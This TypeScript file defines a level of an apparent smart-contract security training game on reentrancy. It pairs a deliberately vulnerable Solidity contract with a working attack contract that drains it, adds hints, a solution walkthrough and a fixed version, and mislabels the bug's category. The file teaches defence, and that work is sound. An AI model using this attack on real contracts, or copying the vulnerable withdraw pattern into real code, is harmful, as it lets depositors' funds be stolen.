import type { Level } from '@/types';

const level: Level = {
  id: 1,
  title: 'Reentrancy Attack',
  slug: 'reentrancy',
  difficulty: 'Easy',
  category: 'Access Control',
  description:
    'Reentrancy is one of the most devastating vulnerabilities in smart contracts. It occurs when an external call to another contract is made before the state of the calling contract is updated. The attacker can recursively call back into the vulnerable function, draining funds before the balance is ever decremented.',
  objective:
    'Drain all ETH from the EtherStore contract by exploiting the reentrancy vulnerability in the withdraw() function.',
  vulnerableContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");

        // Vulnerability: sending ETH before updating state
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // State update happens AFTER the external call
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,
  attackContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EtherStore.sol";

contract ReentrancyAttack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract
    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT, "Need at least 1 ether");
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,
  hints: [
    'Look at the order of operations in the withdraw() function. What happens first: the ETH transfer or the balance update?',
    'When a contract receives ETH via call{value: ...}(""), its receive() or fallback() function is triggered. What if that function calls withdraw() again?',
    'Deploy an attack contract whose receive() function calls etherStore.withdraw() recursively. Deposit 1 ETH first, then call withdraw. Each re-entry will send another 1 ETH because balances[msg.sender] has not been set to 0 yet.',
  ],
  solution:
    'Deploy the ReentrancyAttack contract with the EtherStore address. Call attack() with 1 ETH. This deposits 1 ETH into EtherStore, then calls withdraw(). EtherStore sends 1 ETH back to the attack contract, triggering receive(). Inside receive(), withdraw() is called again. Since balances[attacker] is still 1 ETH (not yet zeroed), the check passes and another 1 ETH is sent. This loop continues until EtherStore is drained.',
  explanation:
    'The root cause is the Checks-Effects-Interactions pattern violation. The EtherStore contract performs an external call (Interaction) before updating its internal state (Effect). In Solidity, when you send ETH to a contract using call{value: ...}(""), the receiving contract\'s receive() or fallback() function executes. If the receiver calls back into the sender before the sender finishes executing, the sender\'s state is stale. The attacker exploits this by re-entering withdraw() before balances[msg.sender] is set to 0.',
  secureCoding: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStoreSecure {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public noReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");

        // Fix: Update state BEFORE making external call
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,
  realWorldImpact:
    'The DAO Hack (2016) - An attacker exploited a reentrancy vulnerability in The DAO smart contract to drain approximately 3.6 million ETH (around $60 million at the time). This led to a contentious hard fork of the Ethereum blockchain, creating Ethereum (ETH) and Ethereum Classic (ETC). It remains one of the most significant events in blockchain history and fundamentally changed how smart contract security is approached.',
  moduleMapping: 'Module 3.1 Web Application Vulnerabilities',
  attackSteps: [
    {
      title: 'Deploy Vulnerable Contract',
      description:
        'The EtherStore contract is deployed and multiple users deposit ETH into it, building up a pool of funds.',
      stateChange: 'EtherStore balance: 0 ETH -> 10 ETH (from various depositors)',
    },
    {
      title: 'Deploy Attack Contract',
      description:
        'The attacker deploys the ReentrancyAttack contract, passing the EtherStore address to its constructor.',
      code: 'ReentrancyAttack attacker = new ReentrancyAttack(address(etherStore));',
      stateChange: 'Attack contract deployed, linked to EtherStore',
    },
    {
      title: 'Initiate Attack',
      description:
        'The attacker calls attack() with 1 ETH. This deposits 1 ETH into EtherStore to establish a valid balance, then immediately calls withdraw().',
      code: 'attacker.attack{value: 1 ether}();',
      stateChange: 'EtherStore balance: 10 ETH -> 11 ETH (deposit) -> withdraw begins',
    },
    {
      title: 'Recursive Reentrancy',
      description:
        'EtherStore sends 1 ETH to the attack contract. The receive() function fires and calls withdraw() again. Because balances[attacker] is still 1 ETH, the require check passes. This repeats until EtherStore is drained.',
      stateChange:
        'Each re-entry: EtherStore sends 1 ETH, balance decrements by 1 ETH. Loop continues 10+ times.',
    },
    {
      title: 'Funds Drained',
      description:
        'The recursion ends when EtherStore\'s balance drops below 1 ETH. The attacker\'s contract now holds all the drained ETH. Only then does balances[attacker] finally get set to 0.',
      stateChange: 'EtherStore balance: 0 ETH. Attacker balance: 11 ETH (1 deposited + 10 stolen)',
    },
  ],
};

export default level;
